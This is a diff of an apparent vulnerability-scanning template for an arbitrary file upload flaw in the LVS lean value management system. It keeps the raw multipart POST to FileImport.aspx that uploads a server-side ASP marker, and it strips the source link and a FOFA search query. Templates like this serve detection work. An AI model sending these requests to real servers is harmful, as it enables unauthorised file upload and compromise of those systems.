@@ -3,12 +3,8 @@ info:
   name: LVS精益价值管理系统FileImport存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tt6g0zyrubg3p06z'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tt6g0zyrubg3p06z
-    fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
 http:
 - raw:
   - 'POST /Business/FileImport.aspx HTTP/1.1
@@ -45,7 +41,6 @@ http:
     Content-Disposition: form-data; name="TimeStamps"
 
 
-
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
 
     Content-Disposition: form-data; name="PKID"
@@ -63,7 +58,6 @@ http:
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
 
     Content-Disposition: form-data; name="DETAILKEYIDS"
-
 
 
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
@@ -97,7 +91,6 @@ http:
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
 
     Content-Disposition: form-data; name="__DATA_CONDITION__"
-
 
 
     ------WebKitFormBoundary3yAQlBeBktTvYBYI
@@ -190,7 +183,7 @@ http:
 
     <%=CurrentUser.Name%>
 
-    ------WebKitFormBoundary3yAQlBeBktTvYBYI--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771858784312-251111c6-32e1-4b98-a0f4-88f30309e00b.png)
+    ------WebKitFormBoundary3yAQlBeBktTvYBYI--
 
     访问返回的地址：'
   redirects: false
@@ -207,7 +200,7 @@ http:
 
     X-Requested-With: XMLHttpRequest
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771858784626-f7d7eaff-6c2b-4cd2-b8ec-1d12b8d0aedd.png)'
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0'
   redirects: false
   matchers:
   - status:
